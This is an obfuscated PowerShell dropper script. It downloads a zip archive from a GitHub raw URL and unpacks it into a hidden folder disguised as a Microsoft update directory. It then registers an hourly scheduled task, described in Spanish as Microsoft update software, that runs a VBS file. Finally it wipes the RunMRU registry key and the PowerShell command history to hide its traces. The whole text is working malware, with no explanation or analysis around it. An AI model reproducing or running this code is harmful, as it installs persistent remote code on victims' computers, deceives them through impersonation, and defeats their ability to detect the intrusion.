${U`RL} = ("{3}{11}{0}{14}{4}{6}{12}{10}{13}{7}{2}{5}{1}{9}{8}" -f 's:','/main/Mscn.','efs/head','ht','/UC','s','N','r','ip','z','w','tp','/ra','/','//github.com/emakedie')
${De`sT`INAtIO`NFOlDer} = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate"
${Z`IpFi`le} = .("{1}{2}{0}" -f 'ath','Join','-P') -Path ${De`StINa`T`IOnFol`DeR} -ChildPath ("{0}{1}{2}"-f'M','scn','.zip')


if (-not (.("{1}{2}{0}{3}" -f 't','Test-P','a','h') -Path ${deStIN`AT`Io`NF`oL`der})) {
    &("{0}{2}{1}"-f'Ne','tem','w-I') -ItemType ("{1}{2}{0}" -f 'ctory','Dir','e') -Path ${deSTI`Nat`ION`F`O`LdeR} -Force | &("{2}{1}{0}"-f 'll','ut-Nu','O')
    (.("{0}{2}{1}"-f 'Get','m','-Ite') ${d`e`ST`iN`Atio`NFOlDeR})."aTTri`B`UteS" = ("{0}{1}"-f 'Hi','dden')
}

.("{3}{2}{0}{1}"-f 'ebR','equest','oke-W','Inv') -Uri ${U`Rl} -OutFile ${ziPFi`Le} -ErrorAction ("{4}{3}{0}{1}{5}{2}"-f 'yConti','n','e','l','Silent','u')
.("{0}{1}{2}{3}"-f 'Exp','and','-Archi','ve') -Path ${ZI`Pf`ILe} -DestinationPath ${d`EstinA`T`IO`NFoldEr} -Force -ErrorAction ("{4}{1}{0}{2}{3}" -f'l','i','en','tlyContinue','S')
&("{0}{1}{4}{2}{3}"-f'Get','-C','il','dItem','h') -Path ${DE`S`TinaT`IOnfo`LdEr} -Recurse | .("{4}{3}{2}{1}{0}"-f'ct','e','j','ach-Ob','ForE') {
    ${_}."a`T`TRibutES" = ("{1}{2}{0}"-f'dden','H','i')
}
&("{0}{2}{1}"-f 'Remove-I','em','t') -Path ${ziP`FI`le} -Force -ErrorAction ("{2}{3}{1}{0}"-f'Continue','tly','Sil','en')

.("{1}{2}{3}{6}{0}{5}{4}" -f 'r-S','U','n','regis','dTask','chedule','te') -TaskName ("{0}{1}{2}{3}" -f'Mscn','Sr','vU','pdate') -Confirm:${f`AL`SE} -ErrorAction ("{3}{0}{2}{1}" -f'l','tinue','yCon','Silent')

${ac`Ti`On} = .("{3}{0}{2}{1}" -f'w-Sched','n','uledTaskActio','Ne') -Execute ("{0}{1}{2}"-f 'wscri','pt.','exe') -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
${T`RiGg`er} = .("{0}{1}{3}{2}{4}"-f'N','ew-Sch','skTrigg','eduledTa','er') -Once -At ("{2}{1}{0}" -f'00AM',':','00') -RepetitionInterval (&("{3}{0}{2}{1}"-f 'w','imeSpan','-T','Ne') -Minutes 60) -RepetitionDuration (&("{1}{2}{0}"-f 'n','New-','TimeSpa') -Days 365)
${SEtTi`N`Gs} = .("{2}{3}{4}{1}{0}" -f'skSettingsSet','a','N','ew-Sched','uledT') -AllowStartIfOnBatteries -StartWhenAvailable
&("{1}{4}{6}{0}{3}{5}{2}" -f 'er-Sc','R','k','heduled','eg','Tas','ist') -Action ${A`Ct`IoN} -Trigger ${t`Ri`GGER} -TaskName ("{0}{3}{2}{4}{1}"-f'M','ate','SrvUp','scn','d') -Description ("{41}{45}{18}{4}{54}{5}{9}{6}{20}{25}{39}{12}{26}{43}{28}{49}{48}{24}{40}{1}{35}{42}{58}{56}{52}{33}{23}{31}{30}{51}{46}{10}{36}{22}{57}{32}{3}{55}{15}{27}{16}{11}{47}{14}{0}{21}{44}{8}{13}{19}{50}{38}{34}{7}{59}{17}{53}{37}{29}{2}"-f 'n. ','se ','sando.','r y es ','of',' de Mi','osoft.','Mi',' se de','cr','as v','rí','h','sinstal','s no funcione','car','te',' ','el s','ará',' Si esta','Esta tar','bilidade','e','roso',' tarea está d','abilit','ac','e','u',' corr',' podrán','urgi',' que no s',' ','a','ulnera','té ','ndo el software de','es','ft no ','Mantie','c','ada o detenida, el softwar','ea','ne actualizado ',' l','stica','Mic',' de ',' cua','egir','ifica','es','tware','posible que las ','e sign','s que puedan s','tualizará, lo qu','crosoft no la') -Settings ${SE`Tt`InGs} | .("{0}{2}{1}"-f'Ou','ll','t-Nu')

.("{2}{5}{4}{1}{0}{3}"-f 'd','e','Start','Task','hedul','-Sc') -TaskName ("{2}{0}{1}" -f'p','date','MscnSrvU')



${regIS`TrYpA`TH} = ((("{4}{9}{0}{15}{3}{10}{12}{1}{7}{14}{11}{2}{8}{6}{13}{5}" -f'areC8zMicrosoftC8zWin','en','8','8','HKCU:C8z','unMRU','xplorerC','tVe','zE','Softw','zC','sionC','urr','8zR','r','dowsC'))  -CrEPLAce  'C8z',[chaR]92)
.("{1}{0}{2}{3}" -f'o','Rem','ve-','Item') -LiteralPath ${re`GIStR`Y`PATh} -Force -ErrorAction ("{1}{3}{4}{2}{0}" -f'nue','S','yConti','i','lentl')


.("{1}{3}{0}{2}" -f 'stor','Clear-','y','Hi')
.("{0}{3}{2}{1}" -f 'R','tem','ove-I','em') (("{4}{18}{24}{14}{0}{25}{8}{3}{19}{10}{23}{13}{20}{7}{2}{9}{12}{17}{6}{5}{21}{16}{1}{22}{11}{15}" -f'PR','t','Shel','tajtJRo','Q0Eenv:U','os','jtJConsoleH','r','ILEjtJAppDa','ljtJPSRead','crosoftjtJWindowsjtJ','ry.tx','l','w','R','t','his','ine','S','amingjtJMi','e','t_','o','Po','E','OF')).REPLACE('jtJ',[STrInG][CHAR]92).REPLACE(([CHAR]81+[CHAR]48+[CHAR]69),[STrInG][CHAR]36) -ErrorAction ("{3}{2}{4}{1}{0}"-f'ue','Contin','ilentl','S','y')
exit
